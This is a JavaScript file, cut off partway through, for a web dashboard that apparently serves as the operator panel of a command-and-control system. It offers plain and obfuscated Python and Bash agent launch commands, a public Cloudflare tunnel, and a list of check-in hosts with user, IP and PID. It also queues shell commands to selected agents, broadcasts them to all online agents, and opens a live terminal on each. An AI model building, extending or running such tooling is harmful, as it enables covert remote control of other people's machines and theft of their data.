const App = {
    agents: [],
    auditLogs: [],
    selectedAgents: new Set(),
    deployInfo: null,
    securityStatus: null,
    editingAgentId: null,
    refreshTimers: [],
    deployCountdownTimer: null,
    agentFilters: {
        search: "",
        status: "all",
        sort: "health",
    },
    auditFilters: {
        search: "",
        type: "all",
    },

    async init() {
        this.cacheElements();
        this.bindEvents();
        this.setLoading(true, "Loading dashboard...");

        try {
            await Promise.all([
                this.loadStats(),
                this.loadTunnelInfo(),
                this.loadDeployInfo(),
                this.loadSecurityStatus(),
                this.loadAuditLogs(),
                this.loadAgents(),
            ]);
            this.startAutoRefresh();
            this.updateCommandDeck();
        } catch (error) {
            console.error("Dashboard init failed:", error);
            this.notify("The dashboard could not be loaded. Try refreshing the page", "error");
        } finally {
            this.setLoading(false);
        }
    },

    cacheElements() {
        this.ui = {
            loadingOverlay: document.getElementById("loadingOverlay"),
            copyFeedback: document.getElementById("copyFeedback"),
            notifications: document.getElementById("notifications"),
            logoutBtn: document.getElementById("logoutBtn"),
            tunnelUrl: document.getElementById("tunnelUrl"),
            tunnelUrlText: document.getElementById("tunnelUrlText"),
            totalAgents: document.getElementById("totalAgents"),
            liveAgents: document.getElementById("liveAgents"),
            deadAgents: document.getElementById("deadAgents"),
            totalTasks: document.getElementById("totalTasks"),
            commandDeckSummary: document.getElementById("commandDeckSummary"),
            operatorIdentityPill: document.getElementById("operatorIdentityPill"),
            operatorMfaPill: document.getElementById("operatorMfaPill"),
            deployCountdownPill: document.getElementById("deployCountdownPill"),
            tunnelHealthValue: document.getElementById("tunnelHealthValue"),
            tunnelHealthMeta: document.getElementById("tunnelHealthMeta"),
            copyTunnelBtn: document.getElementById("copyTunnelBtn"),
            restartTunnelBtn: document.getElementById("restartTunnelBtn"),
            selectionMissionValue: document.getElementById("selectionMissionValue"),
            selectionMissionMeta: document.getElementById("selectionMissionMeta"),
            selectLiveAgentsBtn: document.getElementById("selectLiveAgentsBtn"),
            clearSelectionBtn: document.getElementById("clearSelectionBtn"),
            openSelectedTerminalBtn: document.getElementById("openSelectedTerminalBtn"),
            deployExpiry: document.getElementById("deployExpiry"),
            refreshDeployBtn: document.getElementById("refreshDeployBtn"),
            pythonDeployCommand: document.getElementById("pythonDeployCommand"),
            obfuscatedPythonDeployCommand: document.getElementById("obfuscatedPythonDeployCommand"),
            bashDeployCommand: document.getElementById("bashDeployCommand"),
            copyPythonDeployBtn: document.getElementById("copyPythonDeployBtn"),
            downloadAgentBtn: document.getElementById("downloadAgentBtn"),
            copyObfuscatedPythonDeployBtn: document.getElementById("copyObfuscatedPythonDeployBtn"),
            downloadObfuscatedAgentBtn: document.getElementById("downloadObfuscatedAgentBtn"),
            copyBashDeployBtn: document.getElementById("copyBashDeployBtn"),
            downloadBashAgentBtn: document.getElementById("downloadBashAgentBtn"),
            quickCommand: document.getElementById("quickCommand"),
            sendQuickCmd: document.getElementById("sendQuickCmd"),
            quickCmdStatus: document.getElementById("quickCmdStatus"),
            commandPresets: document.getElementById("commandPresets"),
            broadcastOnlineToggle: document.getElementById("broadcastOnlineToggle"),
            mfaStatusPill: document.getElementById("mfaStatusPill"),
            securityStatusSummary: document.getElementById("securityStatusSummary"),
            setupMfaBtn: document.getElementById("setupMfaBtn"),
            enableMfaBtn: document.getElementById("enableMfaBtn"),
            disableMfaBtn: document.getElementById("disableMfaBtn"),
            mfaCodeInput: document.getElementById("mfaCodeInput"),
            mfaSecretBlock: document.getElementById("mfaSecretBlock"),
            mfaSecretText: document.getElementById("mfaSecretText"),
            mfaUriText: document.getElementById("mfaUriText"),
            refreshAuditBtn: document.getElementById("refreshAuditBtn"),
            auditSearchInput: document.getElementById("auditSearchInput"),
            auditTypeFilter: document.getElementById("auditTypeFilter"),
            auditLogList: document.getElementById("auditLogList"),
            refreshAgentsBtn: document.getElementById("refreshAgentsBtn"),
            agentSelectionSummary: document.getElementById("agentSelectionSummary"),
            agentSearchInput: document.getElementById("agentSearchInput"),
            agentStatusFilter: document.getElementById("agentStatusFilter"),
            agentSortSelect: document.getElementById("agentSortSelect"),
            copySelectedIdsBtn: document.getElementById("copySelectedIdsBtn"),
            copySelectedHostsBtn: document.getElementById("copySelectedHostsBtn"),
            queueInfoBtn: document.getElementById("queueInfoBtn"),
            managedAgentsMission: document.getElementById("managedAgentsMission"),
            selectAll: document.getElementById("selectAll"),
            agentCards: document.getElementById("agentCards"),
            agentModal: document.getElementById("agentModal"),
            agentNote: document.getElementById("agentNote"),
            agentInterval: document.getElementById("agentInterval"),
            cancelModal: document.getElementById("cancelModal"),
            saveModal: document.getElementById("saveModal"),
        };
    },

    bindEvents() {
        this.ui.logoutBtn?.addEventListener("click", () => Auth.logout());

        this.ui.refreshDeployBtn?.addEventListener("click", () => this.loadDeployInfo(true));
        this.ui.refreshAuditBtn?.addEventListener("click", () => this.loadAuditLogs(true));
        this.ui.refreshAgentsBtn?.addEventListener("click", async () => {
            await Promise.all([this.loadStats(), this.loadAgents(true)]);
        });

        this.ui.copyTunnelBtn?.addEventListener("click", () => {
            const value = this.ui.tunnelUrlText?.textContent || "";
            if (value && value !== "Loading route...") {
                this.copyText(value, "Route copied");
            }
        });
        this.ui.tunnelUrl?.addEventListener("click", () => {
            const value = this.ui.tunnelUrlText?.textContent || "";
            if (value && value !== "Loading route...") {
                this.copyText(value, "Route copied");
            }
        });
        this.ui.restartTunnelBtn?.addEventListener("click", () => this.restartTunnel());

        this.ui.pythonDeployCommand?.addEventListener("click", () => this.copyDeployCommand("python_command", "Python launch command copied"));
        this.ui.obfuscatedPythonDeployCommand?.addEventListener("click", () => this.copyDeployCommand("python_obfuscated_command", "Protected Python launch command copied"));
        this.ui.bashDeployCommand?.addEventListener("click", () => this.copyDeployCommand("bash_command", "Bash launch command copied"));

        this.ui.copyPythonDeployBtn?.addEventListener("click", () => this.copyDeployCommand("python_command", "Python launch command copied"));
        this.ui.copyObfuscatedPythonDeployBtn?.addEventListener("click", () => this.copyDeployCommand("python_obfuscated_command", "Protected Python launch command copied"));
        this.ui.copyBashDeployBtn?.addEventListener("click", () => this.copyDeployCommand("bash_command", "Bash launch command copied"));

        this.ui.downloadAgentBtn?.addEventListener("click", () => this.downloadPayload(this.deployInfo?.python_download_url, "agent.py"));
        this.ui.downloadObfuscatedAgentBtn?.addEventListener("click", () => this.downloadPayload(this.deployInfo?.python_obfuscated_download_url, "agent-obfuscated.py"));
        this.ui.downloadBashAgentBtn?.addEventListener("click", () => this.downloadPayload(this.deployInfo?.bash_download_url, "agent.sh"));

        this.ui.quickCommand?.addEventListener("keydown", (event) => {
            if (event.key === "Enter" && !event.shiftKey) {
                event.preventDefault();
                this.sendQuickCommand();
            }
        });
        this.ui.sendQuickCmd?.addEventListener("click", () => this.sendQuickCommand());
        this.ui.commandPresets?.addEventListener("click", (event) => {
            const preset = event.target.closest("[data-command]");
            if (!preset) {
                return;
            }
            this.ui.quickCommand.value = preset.getAttribute("data-command") || "";
            this.ui.quickCommand.focus();
        });
        this.ui.broadcastOnlineToggle?.addEventListener("change", () => {
            this.updateSelectionSummary();
            this.updateCommandDeck();
        });

        this.ui.setupMfaBtn?.addEventListener("click", () => this.setupMfa());
        this.ui.enableMfaBtn?.addEventListener("click", () => this.enableMfa());
        this.ui.disableMfaBtn?.addEventListener("click", () => this.disableMfa());

        this.ui.auditSearchInput?.addEventListener("input", (event) => {
            this.auditFilters.search = String(event.target.value || "").trim().toLowerCase();
            this.renderAuditLogs();
        });
        this.ui.auditTypeFilter?.addEventListener("change", (event) => {
            this.auditFilters.type = String(event.target.value || "all");
            this.renderAuditLogs();
        });

        this.ui.agentSearchInput?.addEventListener("input", (event) => {
            this.agentFilters.search = String(event.target.value || "").trim().toLowerCase();
            this.renderAgents();
        });
        this.ui.agentStatusFilter?.addEventListener("change", (event) => {
            this.agentFilters.status = String(event.target.value || "all");
            this.renderAgents();
        });
        this.ui.agentSortSelect?.addEventListener("change", (event) => {
            this.agentFilters.sort = String(event.target.value || "health");
            this.renderAgents();
        });

        this.ui.selectLiveAgentsBtn?.addEventListener("click", () => this.selectLiveAgents());
        this.ui.clearSelectionBtn?.addEventListener("click", () => this.clearSelection());
        this.ui.copySelectedIdsBtn?.addEventListener("click", () => this.copySelectedField("id", "Agent IDs copied"));
        this.ui.copySelectedHostsBtn?.addEventListener("click", () => this.copySelectedField("hostname", "Hostnames copied"));
        this.ui.queueInfoBtn?.addEventListener("click", () => this.bulkQueueInfo());
        this.ui.openSelectedTerminalBtn?.addEventListener("click", () => this.openSelectedTerminal());

        this.ui.selectAll?.addEventListener("change", (event) => {
            const checked = Boolean(event.target.checked);
            const visibleAgents = this.getVisibleAgents();
            visibleAgents.forEach((agent) => {
                if (checked) {
                    this.selectedAgents.add(agent.id);
                } else {
                    this.selectedAgents.delete(agent.id);
                }
            });
            this.renderAgents();
        });

        this.ui.agentCards?.addEventListener("change", (event) => {
            const checkbox = event.target.closest("[data-agent-select]");
            if (!checkbox) {
                return;
            }

            const agentId = checkbox.getAttribute("data-agent-id");
            if (!agentId) {
                return;
            }

            if (checkbox.checked) {
                this.selectedAgents.add(agentId);
            } else {
                this.selectedAgents.delete(agentId);
            }
            this.updateSelectionSummary();
            this.syncSelectAll();
            this.updateCommandDeck();
            this.renderAgents();
        });

        this.ui.agentCards?.addEventListener("click", (event) => {
            const actionButton = event.target.closest("[data-action]");
            if (!actionButton) {
                return;
            }

            const agentId = actionButton.getAttribute("data-agent-id");
            const action = actionButton.getAttribute("data-action");
            if (!agentId || !action) {
                return;
            }

            if (action === "terminal") {
                this.openTerminal(agentId);
            } else if (action === "edit") {
                this.openEditModal(agentId);
            } else if (action === "delete") {
                this.deleteAgent(agentId);
            }
        });

        this.ui.cancelModal?.addEventListener("click", () => this.closeModal());
        this.ui.saveModal?.addEventListener("click", () => this.saveAgentChanges());
        this.ui.agentModal?.addEventListener("click", (event) => {
            if (event.target === this.ui.agentModal) {
                this.closeModal();
            }
        });

        document.addEventListener("keydown", (event) => {
            if (event.key === "Escape" && this.ui.agentModal?.classList.contains("active")) {
                this.closeModal();
                return;
            }
            if (event.key === "/" && !this.isTypingInInput(event.target)) {
                event.preventDefault();
                this.ui.agentSearchInput?.focus();
                this.ui.agentSearchInput?.select();
                return;
            }
            if (event.key.toLowerCase() === "q" && !this.isTypingInInput(event.target)) {
                event.preventDefault();
                this.ui.quickCommand?.focus();
                this.ui.quickCommand?.select();
            }
        });

        window.addEventListener("beforeunload", () => {
            this.stopAutoRefresh();
        });
    },

    startAutoRefresh() {
        this.stopAutoRefresh();
        this.refreshTimers.push(window.setInterval(() => this.loadStats(), 5000));
        this.refreshTimers.push(window.setInterval(() => this.loadAgents(), 5000));
        this.refreshTimers.push(window.setInterval(() => this.loadTunnelInfo(), 15000));
        this.refreshTimers.push(window.setInterval(() => this.loadSecurityStatus(), 30000));
        this.refreshTimers.push(window.setInterval(() => this.loadAuditLogs(), 30000));
    },

    stopAutoRefresh() {
        this.refreshTimers.forEach((timerId) => window.clearInterval(timerId));
        this.refreshTimers = [];
        if (this.deployCountdownTimer) {
            window.clearInterval(this.deployCountdownTimer);
            this.deployCountdownTimer = null;
        }
    },

    isTypingInInput(target) {
        return Boolean(target?.closest?.("input, textarea, select"));
    },

    async apiJson(url, options = {}) {
        const response = await Auth.apiCall(url, options);
        let data = null;
        try {
            data = await response.json();
        } catch (_error) {
            data = null;
        }

        if (!response.ok) {
            const detail = data?.detail || `Request failed with HTTP ${response.status}`;
            throw new Error(detail);
        }

        return data;
    },

    async loadStats() {
        const stats = await this.apiJson("/api/v1/stats");
        this.updateStatValue(this.ui.totalAgents, stats.total_agents || 0);
        this.updateStatValue(this.ui.liveAgents, stats.alive_agents || 0);
        this.updateStatValue(this.ui.deadAgents, stats.dead_agents || 0);
        this.updateStatValue(this.ui.totalTasks, stats.total_tasks || 0);
        this.updateCommandDeck();
    },

    async loadTunnelInfo() {
        try {
            const data = await this.apiJson("/api/v1/tunnel-info");
            const tunnelUrl = data.tunnel_url || window.location.origin;
            this.ui.tunnelUrlText.textContent = tunnelUrl;
            this.ui.tunnelHealthValue.textContent = tunnelUrl.includes("trycloudflare.com") ? "Public route is ready" : "Local access only";
            this.ui.tunnelHealthMeta.textContent = tunnelUrl;
        } catch (error) {
            console.error("Failed to load tunnel info:", error);
            this.ui.tunnelUrlText.textContent = window.location.origin;
            this.ui.tunnelHealthValue.textContent = "Using local address";
            this.ui.tunnelHealthMeta.textContent = "Tunnel details are unavailable, so the local address is shown instead";
        }
        this.updateCommandDeck();
    },

    async loadDeployInfo(showToast = false) {
        try {
            const data = await this.apiJson("/api/v1/deploy");
            this.deployInfo = data;
            this.ui.pythonDeployCommand.textContent = data.python_command;
            this.ui.obfuscatedPythonDeployCommand.textContent = data.python_obfuscated_command;
            this.ui.bashDeployCommand.textContent = data.bash_command;
            this.ui.deployExpiry.textContent = `These launch links expire at ${this.formatAbsoluteDate(data.expires_at)}. Refresh them after a route restart or when the timer runs out`;

            [
                this.ui.copyPythonDeployBtn,
                this.ui.downloadAgentBtn,
                this.ui.copyObfuscatedPythonDeployBtn,
                this.ui.downloadObfuscatedAgentBtn,
                this.ui.copyBashDeployBtn,
                this.ui.downloadBashAgentBtn,
            ].forEach((button) => {
                if (button) {
                    button.disabled = false;
                }
            });

            this.startDeployCountdown();
            this.updateCommandDeck();

            if (showToast) {
                this.notify("Launch links refreshed", "success");
            }
        } catch (error) {
            console.error("Failed to load deploy info:", error);
            this.notify(error.message || "Could not generate launch links", "error");
        }
    },

    startDeployCountdown() {
        if (this.deployCountdownTimer) {
            window.clearInterval(this.deployCountdownTimer);
        }
        this.updateDeployCountdown();
        this.deployCountdownTimer = window.setInterval(() => this.updateDeployCountdown(), 1000);
    },

    updateDeployCountdown() {
        if (!this.deployInfo?.expires_at) {
            this.ui.deployCountdownPill.textContent = "Launch links expire in --";
            return;
        }

        const expiry = this.parseServerDate(this.deployInfo.expires_at);
        const remainingMs = expiry.getTime() - Date.now();
        if (remainingMs <= 0) {
            this.ui.deployCountdownPill.textContent = "Launch links expired";
            return;
        }

        const totalSeconds = Math.floor(remainingMs / 1000);
        const minutes = Math.floor(totalSeconds / 60);
        const seconds = totalSeconds % 60;
        this.ui.deployCountdownPill.textContent = `Launch links expire in ${minutes}m ${seconds.toString().padStart(2, "0")}s`;
    },

    async loadSecurityStatus() {
        try {
            const data = await this.apiJson("/api/v1/security/status");
            this.securityStatus = data;
            this.renderSecurityStatus();
        } catch (error) {
            console.error("Failed to load security status:", error);
            this.ui.securityStatusSummary.textContent = "Account details could not be loaded";
            this.updateCommandDeck();
        }
    },

    renderSecurityStatus() {
        if (!this.securityStatus) {
            return;
        }

        const { mfa_enabled: mfaEnabled, user, lockout_policy: lockoutPolicy, rate_limits: rateLimits } = this.securityStatus;
        this.ui.mfaStatusPill.textContent = mfaEnabled ? "MFA on" : "MFA off";
        this.ui.mfaStatusPill.classList.toggle("enabled", Boolean(mfaEnabled));
        this.ui.mfaStatusPill.classList.toggle("disabled", !mfaEnabled);

        const summary = [
            `${user?.username || "Unknown user"} is signed in`,
            `Last sign-in: ${user?.last_login_at ? this.formatAbsoluteDate(user.last_login_at) : "not recorded yet"}`,
            `Lock after ${lockoutPolicy?.max_attempts || 5} failed attempts for ${lockoutPolicy?.lock_minutes || 15} minutes`,
            `Rate limits: login ${rateLimits?.login || "-"}, refresh ${rateLimits?.refresh || "-"}, deploy ${rateLimits?.deploy || "-"}`,
        ];
        this.ui.securityStatusSummary.textContent = summary.join(" • ");

        this.ui.enableMfaBtn.disabled = Boolean(mfaEnabled);
        this.ui.disableMfaBtn.disabled = !mfaEnabled;
        this.updateCommandDeck();
    },

    async loadAuditLogs(showToast = false) {
        try {
            const data = await this.apiJson("/api/v1/audit-logs?limit=40");
            this.auditLogs = Array.isArray(data.logs) ? data.logs : [];
            this.renderAuditLogs();
            if (showToast) {
                this.notify("Recent activity refreshed", "success");
            }
        } catch (error) {
            console.error("Failed to load audit logs:", error);
            this.ui.auditLogList.innerHTML = `
                <div class="activity-item">
                    <div class="activity-event">Recent activity could not be loaded</div>
                    <div class="activity-meta">${this.escapeHtml(error.message || "Unknown error")}</div>
                </div>
            `;
        }
    },

    renderAuditLogs() {
        const search = this.auditFilters.search;
        const type = this.auditFilters.type;
        const filteredLogs = this.auditLogs.filter((log) => {
            const eventType = String(log.event_type || "");
            const haystack = [
                log.actor_username,
                log.event_type,
                log.target_type,
                log.target_id,
                log.details,
            ].join(" ").toLowerCase();
            const matchesSearch = !search || haystack.includes(search);
            const matchesType = type === "all" || eventType.startsWith(type);
            return matchesSearch && matchesType;
        });

        if (!filteredLogs.length) {
            this.ui.auditLogList.innerHTML = `
                <div class="activity-item">
                    <div class="activity-event">Nothing to show yet</div>
                    <div class="activity-meta">New sign-ins, deploy actions, security changes, and agent events will appear here</div>
                </div>
            `;
            return;
        }

        this.ui.auditLogList.innerHTML = filteredLogs.map((log) => {
            const actor = log.actor_username || "system";
            const target = [log.target_type, log.target_id].filter(Boolean).join(": ") || "n/a";
            const details = log.details || "No extra details recorded";
            return `
                <div class="activity-item">
                    <div class="activity-event">${this.escapeHtml(log.event_type || "event")}</div>
                    <div class="activity-meta">
                        ${this.escapeHtml(actor)} · ${this.escapeHtml(target)}<br>
                        ${this.escapeHtml(this.formatAbsoluteDate(log.created_at))}<br>
                        ${this.escapeHtml(details)}
                    </div>
                </div>
            `;
        }).join("");
    },

    async loadAgents(showToast = false) {
        try {
            const data = await this.apiJson("/api/v1/agents");
            this.agents = Array.isArray(data.agents) ? data.agents : [];
            this.selectedAgents = new Set(
                [...this.selectedAgents].filter((agentId) => this.agents.some((agent) => agent.id === agentId))
            );
            this.renderAgents();
            if (showToast) {
                this.notify("Agent list refreshed", "success");
            }
        } catch (error) {
            console.error("Failed to load agents:", error);
            this.notify(error.message || "Could not load agents", "error");
        }
    },

    getVisibleAgents() {
        const search = this.agentFilters.search;
        const status = this.agentFilters.status;
        const sort = this.agentFilters.sort;

        let agents = [...this.agents];

        if (search) {
            agents = agents.filter((agent) => {
                const haystack = [
                    agent.id,
                    agent.hostname,
                    agent.username,
                    agent.internal_ip,
                    agent.os_info,
                    agent.note,
                ].join(" ").toLowerCase();
                return haystack.includes(search);
            });
        }

        if (status === "online") {
            agents = agents.filter((agent) => agent.is_alive === true);
        } else if (status === "offline") {
            agents = agents.filter((agent) => agent.is_alive !== true);
        } else if (status === "selected") {
            agents = agents.filter((agent) => this.selectedAgents.has(agent.id));
        }

        agents.sort((left, right) => {
            if (sort === "hostname") {
                return String(left.hostname || "").localeCompare(String(right.hostname || ""));
            }
            if (sort === "last_seen") {
                return this.parseServerDate(right.last_seen) - this.parseServerDate(left.last_seen);
            }
            if (sort === "callback") {
                return (left.callback_interval || 9999) - (right.callback_interval || 9999);
            }

            if (left.is_alive === right.is_alive) {
                return this.parseServerDate(right.last_seen) - this.parseServerDate(left.last_seen);
            }
            return left.is_alive ? -1 : 1;
        });

        return agents;
    },

    renderAgents() {
        if (!this.ui.agentCards) {
            return;
        }

        const visibleAgents = this.getVisibleAgents();

        if (!this.agents.length) {
            this.ui.agentCards.innerHTML = `
                <div class="agent-card agent-card-empty">
                    <div>
                        <div class="empty-state-icon">::</div>
                        <h3>No agents yet</h3>
                        <p>Create a Python or Bash launch command above to register your first agent</p>
                    </div>
                </div>
            `;
            if (this.ui.managedAgentsMission) {
                this.ui.managedAgentsMission.textContent = "No agents have checked in yet";
            }
            this.updateSelectionSummary();
            this.syncSelectAll();
            this.updateCommandDeck();
            return;
        }

        if (!visibleAgents.length) {
            this.ui.agentCards.innerHTML = `
                <div class="agent-card agent-card-empty">
                    <div>
                        <div class="empty-state-icon">::</div>
                        <h3>No agents match these filters</h3>
                        <p>Try clearing the search or changing the state filter</p>
                    </div>
                </div>
            `;
            if (this.ui.managedAgentsMission) {
                this.ui.managedAgentsMission.textContent = "Nothing matches the current filters";
            }
            this.updateSelectionSummary(visibleAgents);
            this.syncSelectAll(visibleAgents);
            this.updateCommandDeck();
            return;
        }

        this.ui.agentCards.innerHTML = visibleAgents.map((agent) => {
            const isAlive = agent.is_alive === true;
            const isSelected = this.selectedAgents.has(agent.id);
            const presenceLabel = isAlive ? "Online" : "Offline";
            const presenceMeta = isAlive
                ? `Checks in about every ${agent.callback_interval || 5}s`
                : this.buildOfflineReason(agent);
            const notePreview = agent.note
                ? `
                    <div class="agent-note-preview">
                        <div class="agent-meta-label">Note</div>
                        <div class="agent-note-text">${this.escapeHtml(agent.note)}</div>
                    </div>
                `
                : "";

            return `
                <article class="agent-card ${isAlive ? "agent-card-online" : "agent-card-offline"} ${isSelected ? "agent-card-selected" : ""}">
                    <div class="agent-card-top">
                        <label class="agent-select-toggle">
                            <input type="checkbox" data-agent-select data-agent-id="${this.escapeHtml(agent.id)}" ${isSelected ? "checked" : ""}>
                            <span>Track</span>
                        </label>
                        <div class="agent-status-badge ${isAlive ? "live" : "dead"}">
                            <span class="status-indicator ${isAlive ? "live" : "dead"}"></span>
                            <span>${presenceLabel}</span>
                        </div>
                    </div>

                    <div class="agent-card-host-row">
                        <div class="agent-card-host-wrap">
                            <div class="agent-card-hostname">${this.escapeHtml(agent.hostname || "Unknown host")}</div>
                            <div class="agent-card-subtitle">${this.escapeHtml(agent.username || "unknown")} · ${this.escapeHtml(agent.os_info || "Unknown OS")}</div>
                        </div>
                        <div class="agent-card-id"><code>${this.escapeHtml(this.shortId(agent.id))}</code></div>
                    </div>

                    <div class="agent-meta-grid">
                        <div class="agent-meta-item">
                            <div class="agent-meta-label">Address</div>
                            <div class="agent-meta-value">${this.escapeHtml(agent.internal_ip || "Unavailable")}</div>
                            <div class="agent-meta-subtext">Reported local IP</div>
                        </div>
                        <div class="agent-meta-item">
                            <div class="agent-meta-label">Callback</div>
                            <div class="agent-meta-value">${this.escapeHtml(String(agent.callback_interval || 5))}s</div>
                            <div class="agent-meta-subtext">${this.escapeHtml(presenceMeta)}</div>
                        </div>
                        <div class="agent-meta-item">
                            <div class="agent-meta-label">Last Seen</div>
                            <div class="agent-meta-value">${this.escapeHtml(this.formatRelativeTime(agent.last_seen))}</div>
                            <div class="agent-meta-subtext">${this.escapeHtml(this.formatAbsoluteDate(agent.last_seen))}</div>
                        </div>
                        <div class="agent-meta-item">
                            <div class="agent-meta-label">First Seen</div>
                            <div class="agent-meta-value">${this.escapeHtml(this.formatAbsoluteDate(agent.first_seen))}</div>
                            <div class="agent-meta-subtext">PID ${this.escapeHtml(String(agent.pid || 0))}</div>
                        </div>
                    </div>

                    ${notePreview}

                    <div class="agent-card-actions">
                        <button
                            class="btn btn-small btn-info agent-card-btn"
                            data-action="terminal"
                            data-agent-id="${this.escapeHtml(agent.id)}"
                            ${isAlive ? "" : "disabled"}
                            title="${isAlive ? "Open live terminal" : "Terminal is unavailable while this agent is offline"}"
                        >
                            Terminal
                        </button>
                        <button
                            class="btn btn-small btn-warning agent-card-btn"
                            data-action="edit"
                            data-agent-id="${this.escapeHtml(agent.id)}"
                        >
                            Edit
                        </button>
                        <button
                            class="btn btn-small btn-danger agent-card-btn"
                            data-action="delete"
                            data-agent-id="${this.escapeHtml(agent.id)}"
                        >
                            Delete
                        </button>
                    </div>
                </article>
            `;
        }).join("");

        const onlineVisible = visibleAgents.filter((agent) => agent.is_alive === true).length;
        if (this.ui.managedAgentsMission) {
                this.ui.managedAgentsMission.textContent = `${visibleAgents.length} shown • ${onlineVisible} online • ${this.selectedAgents.size} selected`;
        }
        this.updateSelectionSummary(visibleAgents);
        this.syncSelectAll(visibleAgents);
        this.updateCommandDeck();
    },

    buildOfflineReason(agent) {
        if (!agent.last_seen) {
            return "This agent has not checked in yet";
        }
        return `Last check-in was ${this.formatRelativeTime(agent.last_seen)}`;
    },

    updateSelectionSummary(visibleAgents = this.getVisibleAgents()) {
        const total = this.agents.length;
        const visible = visibleAgents.length;
        const selected = this.selectedAgents.size;
        const live = this.agents.filter((agent) => agent.is_alive === true).length;
        const mode = this.ui.broadcastOnlineToggle?.checked ? "broadcast" : "selection";
        this.ui.agentSelectionSummary.textContent = `${selected} selected • ${live} online • ${visible}/${total} shown • ${mode}`;
    },

    syncSelectAll(visibleAgents = this.getVisibleAgents()) {
        if (!this.ui.selectAll) {
            return;
        }
        if (!visibleAgents.length) {
            this.ui.selectAll.checked = false;
            this.ui.selectAll.indeterminate = false;
            return;
        }
        const selectedVisibleCount = visibleAgents.filter((agent) => this.selectedAgents.has(agent.id)).length;
        this.ui.selectAll.checked = selectedVisibleCount === visibleAgents.length;
        this.ui.selectAll.indeterminate = selectedVisibleCount > 0 && selectedVisibleCount < visibleAgents.length;
    },

    getQuickCommandTargets() {
        if (this.ui.broadcastOnlineToggle?.checked) {
            return this.agents.filter((agent) => agent.is_alive === true).map((agent) => agent.id);
        }
        return [...this.selectedAgents];
    },

    async sendQuickCommand() {
        const command = (this.ui.quickCommand?.value || "").trim();
        if (!command) {
            this.setQuickStatus("Enter a command first", "error");
            return;
        }

        const targetIds = this.getQuickCommandTargets();
        if (!targetIds.length) {
            this.setQuickStatus("Select targets or turn on broadcast to online agents first", "error");
            return;
        }

        await this.queueCommandToAgents(command, targetIds, {
            startedMessage: `Queueing a command for ${targetIds.length} agent(s)...`,
            successMessage: `Queued the command for ${targetIds.length} agent(s)`,
            button: this.ui.sendQuickCmd,
            clearInput: true,
        });
    },

    async bulkQueueInfo() {
        const targetIds = this.getQuickCommandTargets();
        if (!targetIds.length) {
            this.notify("Select targets or turn on broadcast to online agents first", "warning");
            return;
        }
        await this.queueCommandToAgents("!info", targetIds, {
            startedMessage: `Queueing !info for ${targetIds.length} agent(s)...`,
            successMessage: `Queued !info for ${targetIds.length} agent(s)`,
            button: this.ui.queueInfoBtn,
            preserveStatus: true,
        });
    },

    async queueCommandToAgents(command, agentIds, options = {}) {
        const {
            startedMessage = `Queueing a command for ${agentIds.length} agent(s)...`,
            successMessage = "Command queued",
            button = null,
            clearInput = false,
            preserveStatus = false,
        } = options;

        if (button) {
            button.disabled = true;
        }
        if (!preserveStatus) {
            this.setQuickStatus(startedMessage, "info");
        }

        try {
            const results = await Promise.allSettled(
                agentIds.map((agentId) =>
                    this.apiJson(`/api/v1/agents/${encodeURIComponent(agentId)}/task`, {
                        method: "POST",
                        body: JSON.stringify({ command }),
                    })
                )
            );

            const succeeded = results.filter((result) => result.status === "fulfilled").length;
            const failed = results.length - succeeded;

            if (succeeded <= 0) {
                const firstError = results.find((result) => result.status === "rejected");
                throw firstError?.reason || new Error("Every task request failed");
            }

            if (clearInput && this.ui.quickCommand) {
                this.ui.quickCommand.value = "";
            }

            if (!preserveStatus) {
                this.setQuickStatus(
                    failed > 0 ? `${successMessage} ${failed} request(s) failed` : successMessage,
                    failed > 0 ? "warning" : "success"
                );
            }
            this.notify(failed > 0 ? `${successMessage} ${failed} failed` : successMessage, failed > 0 ? "warning" : "success");
            await Promise.all([this.loadStats(), this.loadAuditLogs()]);
        } catch (error) {
            console.error("Failed to queue command:", error);
            if (!preserveStatus) {
                this.setQuickStatus(error.message || "Failed to queue command", "error");
            }
            this.notify(error.message || "Failed to queue command", "error");
        } finally {
            if (button) {
                button.disabled = false;
            }
        }
    },

    setQuickStatus(message, kind = "info") {
        if (!this.ui.quickCmdStatus) {
            return;
        }
        this.ui.quickCmdStatus.textContent = message;
        this.ui.quickCmdStatus.className = `quick-cmd-status show ${kind}`;
    },

    selectLiveAgents() {
        this.agents.forEach((agent) => {
            if (agent.is_alive === true) {
                this.selectedAgents.add(agent.id);
            }
        });
        this.renderAgents();
                this.notify("Selected all online agents", "success");
    },

    clearSelection() {
        this.selectedAgents.clear();
        this.renderAgents();
        this.notify("Selection cleared", "info");
    },

    async copySelectedField(field, feedback) {
        const selected = this.agents.filter((agent) => this.selectedAgents.has(agent.id));
        if (!selected.length) {
            this.notify("Select at least one agent first", "warning");
            return;
        }
        const payload = selected.map((agent) => agent[field]).filter(Boolean).join("\n");
        if (!payload) {
            this.notify("There is nothing to copy for the selected agents", "warning");
            return;
        }
        await this.copyText(payload, feedback);
    },

    openSelectedTerminal() {
        const selected = this.agents.filter((agent) => this.selectedAgents.has(agent.id));
        if (selected.length !== 1) {
            this.notify("Select exactly one agent to open a terminal", "warning");
            return;
        }
        this.openTerminal(selected[0].id);
    },

    openTerminal(agentId) {
        const agent = this.agents.find((item) => item.id === agentId);
        if (!agent) {
            this.notify("Agent not found", "error");
            return;
        }
        if (agent.is_alive !== true) {
            this.notify("This agent is offline, so the terminal is not available right now", "warning");
            return;
        }
        window.location.href = `/terminal?id=${encodeURIComponent(agentId)}`;
    },

    openEditModal(agentId) {
        const agent = this.agents.find((item) => item.id === agentId);
        if (!agent) {
            this.notify("Agent not found", "error");
            return;
        }
        this.editingAgentId = agent.id;
        this.ui.agentNote.value = agent.note || "";
        this.ui.agentInterval.value = String(agent.callback_interval || 5);
        this.ui.agentModal.classList.add("active");
    },

    closeModal() {
        this.editingAgentId = null;
        this.ui.agentModal.classList.remove("active");
    },

    async saveAgentChanges() {
        if (!this.editingAgentId) {
            return;
        }

        const payload = {
            note: this.ui.agentNote.value.trim(),
            callback_interval: Number(this.ui.agentInterval.value || 5),
        };

        this.ui.saveModal.disabled = true;
        try {
            await this.apiJson(`/api/v1/agents/${encodeURIComponent(this.editingAgentId)}`, {
                method: "PATCH",
                body: JSON.stringify(payload),
            });
            this.closeModal();
            this.notify("Agent settings saved", "success");
            await Promise.all([this.loadAgents(), this.loadAuditLogs()]);
        } catch (error) {
            console.error("Failed to save agent:", error);
            this.notify(error.message || "Could not update the agent", "error");
        } finally {
            this.ui.saveModal.disabled = false;
        }
    },

    async deleteAgent(agentId) {
        const agent = this.agents.find((item) => item.id === agentId);
